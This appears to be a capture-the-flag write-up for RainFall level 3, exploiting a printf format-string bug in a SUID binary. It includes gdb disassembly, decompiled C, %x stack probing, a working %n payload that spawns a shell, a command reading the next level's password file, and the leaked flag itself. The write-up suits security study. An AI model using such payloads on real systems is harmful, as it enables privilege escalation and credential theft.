# Level 3


Lets see the assembly code :


```gdb
Non-debugging symbols:
0x08048344  _init
0x08048390  printf
0x08048390  printf@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  fwrite
0x080483b0  fwrite@plt
0x080483c0  system
0x080483c0  system@plt
0x080483d0  __gmon_start__
0x080483d0  __gmon_start__@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  v
0x0804851a  main
0x08048530  __libc_csu_init
0x080485a0  __libc_csu_fini
0x080485a2  __i686.get_pc_thunk.bx
0x080485b0  __do_global_ctors_aux
0x080485dc  _fini

(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.

(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.


```

Seems it use fgets, so we cant overflow it by that, and it used system, i doubt it will be easy to reach it tho.


Lets reverse it with ghidra.

```c

void v(void)

{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}


void main(void)

{
  v();
  return;
}

```

We can't overflow the buffer, but the printf is direcly using the buffer as an input.

Its an obvious format attack string.

We can also see that the binary execute a shell, if m is == to 0x40.

Using GDB, its quite easy to make it execute the shell, but it cancel suid.

So we have to make that if goes true using the printf.


We must find the address of the m variable, and insert the value 0x40, but how do we do it using printf ?

First me must find 'm' addresses like so :


```gdb
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
```

m addresses = '0x804988c'


Using the format string attack, we are going to print this addresses, and in C when we print addresses, it get pushed to the stack.


```sh
level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08'" | ./level3 
��
level3@RainFall:~$
```

Now we must get printf to point to this adresses, and for that, we are going to print the addresses using %x until it reach our m variable.

like so :

```
level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + '%x'" | ./level3 
�200
level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + '%x %x'" | ./level3 
�200 b7fd1ac0
level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + '%x %x %x'" | ./level3 
�200 b7fd1ac0 b7ff37d0
level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + '%x %x %x %x'" | ./level3 
�200 b7fd1ac0 b7ff37d0 804988c
level3@RainFall:~$
```

So we need 3 %x to reach our variable, know we must write 0x40 to it.


In printf there is a format called %n, it basically write the number of characters to a pointers.

0x40 = 64, so we must write 64 character and then call %n.

```sh
level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + '%x %x %x' + 'A' * 64 + '%n'" | ./level3 
�200 b7fd1ac0 b7ff37d0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
level3@RainFall:~$
```

It doesn't work, because we already wrote character, everything counts, we ajust the number of A we wrote to 39 so it reach 64 roundly.

```sh
level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + '%x %x %x' + 'A' * 39 + '%n'" | ./level3 
�200 b7fd1ac0 b7ff37d0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
level3@RainFall:~$ 
```

Just need to keep a hand on STDIN and we get our flag

```sh
level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08' + '%x %x %x' + 'A' * 39 + '%n'"; cat) | ./level3 
�200 b7fd1ac0 b7ff37d0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```